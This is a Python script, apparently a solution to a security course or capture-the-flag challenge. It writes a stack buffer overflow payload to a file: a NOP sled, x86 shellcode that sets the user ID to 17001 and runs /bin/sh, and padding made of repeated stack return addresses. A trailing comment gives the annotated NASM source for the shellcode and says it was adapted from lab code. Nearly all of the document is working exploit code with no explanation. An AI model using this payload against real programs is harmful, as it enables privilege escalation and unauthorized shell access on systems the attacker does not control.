from struct import pack


system = pack("<I", 0xf7e63cd0)

noops = "\x90"*100
sc = "\x31\xdb\x66\xbb\x69\x42\x31\xc0\x6a\x17\x58\xcd\x80"
sc += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
sc += "\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80"
exploit = noops + sc + "AAA"+ pack("<I", 0xffffd59f-200) * ((280 - len(noops) - len(sc))/4) + "\x00"

with open("exploit", "w") as f:
    f.write(exploit)



'''Using ISIS lab shell32 modified code

;; Mon Mar 11 05:34:41 PDT 2013
;; EBX, ECX, EDX, ESI, EDI, EBP then stack
BITS 32
global main
        %include "short32.s"
        %include "syscall.s"
        %include "util.s"

before: #My modification for this challenge
        xor ebx, ebx
        mov bx, 17001
        xor eax, eax
        SYSTEM_CALL(setuid)
        #End modification
main:
        ; execve("/bin/sh", 0, 0)
        xor eax, eax
        push eax
        PUSH_STRING "/bin//sh"
        mov ebx, esp            ; arg1 = "/bin//sh\0"
        xor ecx, ecx            ; arg2 = 0  #Changed to xor, instead of mov ecx, eax
        xor edx, edx            ; arg3 = 0  #Changed to xor, instead of mov edx, eax
        SYSTEM_CALL(execve)

'''
